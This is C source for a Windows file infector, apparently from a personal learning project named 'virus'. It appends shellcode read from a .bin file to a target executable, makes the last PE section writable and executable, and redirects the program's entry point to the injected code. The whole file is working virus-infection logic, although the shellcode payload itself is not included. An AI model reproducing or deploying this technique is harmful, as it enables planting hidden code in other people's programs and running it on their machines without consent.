#include <stdio.h>
#include <math.h>
#include <string.h>
#include <stdbool.h>
#include <Windows.h>
#include "exe.h"
#include "shellcode_functions.h"

#pragma warning(disable : 4996)

#define ERROR -1
#define SUCCESS 0

// Binary file.
#define SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
#define INFECTED_PATH "C:\\Users\\User\\source\\repos\\playground\\msgBox.exe"

PVOID get_code_cave_address_in_section(EXE_file* infected, PIMAGE_SECTION_HEADER section, PDWORD result_out, DWORD shellcode_size)
{
    int gap = 0;
    DWORD address = 0;
    BYTE current_byte = 0;
    for (address = section->PointerToRawData; address < (section->SizeOfRawData + section->PointerToRawData); address++)
    {
        current_byte = *(infected->mapped_handle + address);
        if (current_byte == 0x00)
            gap++;
        else gap = 0;

        if (gap >= shellcode_size)
            break;
    }

    *result_out = gap > 0 && gap < section->SizeOfRawData ? SUCCESS : ERROR;
    // Calculate start of code_cave;
    return  address - gap + infected->mapped_handle + 1;

}

PVOID get_code_cave_address(EXE_file* infected, PDWORD result_out, DWORD shellcode_size)
{
    // This function also set the 'infected_section' member of infected EXE_file*.
    DWORD number_of_sections = infected->headers->FileHeader.NumberOfSections;
    printf("File has %d section\n", number_of_sections);
    // first section.
    PIMAGE_SECTION_HEADER first_section = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(infected->headers);
    PIMAGE_SECTION_HEADER current_section = NULL;
    int address = 0;
    int result = 0;
    for (size_t i = 0; i < number_of_sections; i++)
    {
        current_section = first_section + i;
        printf("Current section is %s\n", current_section->Name);
        address = get_code_cave_address_in_section(infected, current_section, &result, shellcode_size);
        if (result == SUCCESS)
        {
            printf("There is place for shell code at address %d\n", address);
            break;
        }
        printf("Not enough place at this section.\n");
    }
    infected->infected_section = current_section;
    *result_out = result;
    return address;
}

DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_out)
{
    printf("add empty place to %s\n", file_name);
    // Return the origianl file size.
    PVOID zero_buffer = calloc(size_of_appned, 1);
    int result = 0;
    HANDLE file_handle = CreateFileA(file_name, // open Two.txt
        FILE_APPEND_DATA,         // open for writing
        FILE_SHARE_READ,          // allow multiple readers
        NULL,                     // no security
        OPEN_EXISTING,              // open or create
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                    // no attr. template

    DWORD original_code_size = GetFileSize(file_handle, NULL);
    printf("old file size is %d\n",original_code_size);

    if (file_handle == INVALID_HANDLE_VALUE)
    {
        printf("Could not open Two.txt.");
        *result_out = ERROR;
        return 0;
    }

    result = WriteFile(file_handle, zero_buffer, size_of_appned, NULL, NULL);
    if (result == 0)
    {
        printf("error appending zeros to end of file");
        *result_out = ERROR;
        return 0;
    }

    printf("new file size is %d\n", GetFileSize(file_handle, NULL));

    CloseHandle(file_handle);
    if (zero_buffer != NULL)
    {
        free(zero_buffer);
    }
    else *result_out = ERROR;

    *result_out = SUCCESS;
    return original_code_size;
}

VOID update_infected_headers(EXE_file* infected, DWORD shellcode_size, PVOID codecave_address)
{
    DWORD new_entery_point = 0;
    infected->infected_section->SizeOfRawData += shellcode_size;
    DWORD code_addition_count = infected->infected_section->SizeOfRawData;
    infected->infected_section->Misc.VirtualSize = code_addition_count;
    ROUND_TO_SECTION_ALIGNMENT(code_addition_count);
    infected->headers->OptionalHeader.SizeOfImage += code_addition_count;
    infected->infected_section->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
    new_entery_point = (DWORD)codecave_address + infected->infected_section->VirtualAddress - infected->infected_section->PointerToRawData - (DWORD)infected->mapped_handle;
    infected->headers->OptionalHeader.AddressOfEntryPoint = new_entery_point;
}

int main()
{
    // Restarting the infected file to original.
    CopyFileA("C:\\Users\\User\\source\\repos\\playground\\Debug\\msgBox.exe", INFECTED_PATH, FALSE);

    int result = SUCCESS;
    EXE_file* infected = NULL;
    HANDLE mapping_handle = { 0 };
    PVOID codecave_address = 0;
    int shellcode_size = 0;
    DWORD new_entery_point = 0;
    PVOID shellcode_buffer = NULL;
    HANDLE shellcode_handle = CreateFileA(SHELLCODE_PATH, GENERIC_READ, FILE_SHARE_READ,          // allow multiple readers
        NULL,                     // no security
        OPEN_ALWAYS,              // open or create
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                    // no attr. template 
    shellcode_size = GetFileSize(shellcode_handle, 0);

    infected = malloc(sizeof(EXE_file));
    if (infected == NULL)
    {
        result = ERROR;
        goto end;
    }

    shellcode_buffer = malloc(shellcode_size);
    if (shellcode_buffer == NULL)
    {
        result = ERROR;
        goto end;
    }
    if (!ReadFile(shellcode_handle, shellcode_buffer, shellcode_size, 0, NULL))
    {
        result = ERROR;
        goto end;
    }

    infected->origianal_file_size = add_file_empty_place(INFECTED_PATH, shellcode_size, &result);
    if (result != SUCCESS)
        goto end;


    // Open the existing file, or if the file does not exist,
    // create a new file.
    infected->handle = CreateFileA(INFECTED_PATH, // open Two.txt
        FILE_APPEND_DATA | GENERIC_READ | GENERIC_WRITE,         // open for writing
        FILE_SHARE_READ,          // allow multiple readers
        NULL,                     // no security
        OPEN_ALWAYS,              // open or create
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                    // no attr. template

    if (infected->handle == INVALID_HANDLE_VALUE)
    {
        printf("Could not open infected file.");
        result = ERROR;
        goto end;
    }
    infected->file_size = GetFileSize(infected->handle, NULL);
    printf("new open file size is %d\n", infected->file_size);
    /*
    * Load the file to the ram.
    * Every change in the ram would cause change on the disk eather.
    */
    mapping_handle = CreateFileMapping(infected->handle, NULL, PAGE_READWRITE, 0, infected->file_size, NULL);
    infected->mapped_handle = (LPBYTE)MapViewOfFile(mapping_handle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, infected->file_size);

    result = set_exe_headers(infected);
    if (result != SUCCESS)
        goto end;

    /*codecave_address = get_code_cave_address(infected, &result, shellcode_size);
    if (result == ERROR)
        goto end;*/
    codecave_address = infected->mapped_handle + infected->origianal_file_size;
    // Last section address.
    infected->infected_section = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(infected->headers) + (infected->headers->FileHeader.NumberOfSections - 1);

    memcpy((LPBYTE)codecave_address, shellcode_buffer, shellcode_size);
    set_addrress_in_shellcode(infected, codecave_address, shellcode_size);

    update_infected_headers(infected, shellcode_size, codecave_address);


end:
    if (infected != NULL)
    {
        CloseHandle(infected->handle);
        free(infected);
    }
    if (shellcode_buffer != NULL)
        free(shellcode_buffer);

    //system(INFECTED_PATH);
    // run the infected.
    return result;
}